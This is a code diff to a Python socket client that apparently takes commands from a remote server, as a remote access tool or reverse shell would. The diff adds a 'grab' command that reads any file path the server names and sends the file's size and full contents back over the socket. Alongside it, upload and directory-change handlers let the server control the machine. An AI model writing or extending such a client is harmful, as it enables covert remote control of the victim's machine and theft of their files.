@@ -46,7 +46,13 @@ class Client:
                             outFile.close()
                         soc.sendall(b'\nfile was successfully uploaded to remote.')#acts as an ack message
                     elif servComArr[0] == 'grab':
-                        print()
+                        fileLocation = servComArr[1]
+                        fileLocation = fileLocation.replace("\\\\", "\\").replace('"', '')  # fix any shlex issues
+                        fileSizeBytes = os.path.getsize(fileLocation)
+                        soc.sendall(str(fileSizeBytes).encode())
+                        soc.recv(BYTEBUFFER)#server ready for transfer
+                        with open(fileLocation, 'rb') as file:
+                            soc.sendall(file.read())
                     elif servComArr[0] == 'cd':
                         try:
                             os.chdir(servComArr[1])
